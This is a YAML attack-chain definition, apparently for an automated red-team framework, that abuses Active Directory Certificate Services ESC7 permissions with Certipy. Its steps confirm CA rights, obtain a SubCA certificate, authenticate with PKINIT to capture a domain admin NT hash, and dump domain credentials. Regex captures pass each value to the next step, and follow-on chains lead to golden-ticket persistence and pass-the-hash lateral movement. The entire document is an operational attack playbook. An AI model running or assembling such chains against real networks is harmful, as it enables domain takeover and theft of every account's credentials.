id: certipy-esc7-ca-manage
name: "ADCS ESC7 — abuse Manage CA / Manage Certificates permission"
description: >
  When a low-priv principal has `Manage CA` or `Manage Certificates`
  rights on the CA itself (not just on a template), they can publish a
  new vulnerable template OR officer-approve a previously-denied request.
  Either way → domain takeover.
tags: [adcs, esc7, priv-esc, certificates, active-directory]
difficulty: hard

inputs:
  - name: dc_ip
    source: target_context.ip
    required: true
  - name: domain
    source: target_context.domain
    required: true
  - name: user
    source: target_context.user
    required: true
  - name: password
    source: target_context.password
    required: true

steps:
  - id: find_esc7
    name: "Confirm Manage CA / Manage Certificates rights"
    command_ref: certipy-find
    inputs:
      ip: "${dc_ip}"
      domain: "${domain}"
      user: "${user}"
      password: "${password}"
    notes: |
      Look at the CA section: `Permissions: Manage CA, Manage Certificates`
      on your principal → ESC7. Note the CA name and the username.
    capture:
      - var: ca_name
        regex: '\[Certificate Authority\][\s\S]*?CA Name\s*:\s*(.+?)$'
        match: first

  - id: enable_template
    name: "Publish (re-enable) the SubCA template via Manage CA"
    command_ref: certipy-esc7
    inputs:
      dc-ip: "${dc_ip}"
      domain: "${domain}"
      user: "${user}"
      password: "${password}"
      ca_name: "${ca_name}"
    notes: |
      Certipy's ESC7 path adds your principal as an officer of the CA, then
      requests a SubCA certificate (which always allows SAN). Two-step
      automatic. Watch for `[+] Certificate written to '<user>.pfx'`.
    capture:
      - var: pfx_file
        regex: "Saved certificate and private key to '(.+?\\.pfx)'"
        match: first

  - id: pkinit_auth
    name: "PKINIT auth → DA NT hash"
    command_ref: certipy-auth
    requires: [pfx_file]
    inputs:
      pfx_file: "${pfx_file}"
      ip: "${dc_ip}"
    capture:
      - var: dc_nt_hash
        regex: "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})"
        match: first

  - id: dcsync
    name: "Loot the domain"
    command_ref: secretsdump
    requires: [dc_nt_hash]

references:
  - title: "Certified Pre-Owned — ESC7"
    url:   "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
  - title: "Certipy ESC7"
    url:   "https://github.com/ly4k/Certipy"

next_chains:
  - chain: ad-persistence-golden-ticket
    when:   'dc_nt_hash captured'
    reason: 'You hold the DA — Golden Ticket time.'
  - chain: pth-lateral-spread
    when:   'dc_nt_hash captured'
    reason: 'Walk every server with the DA hash.'
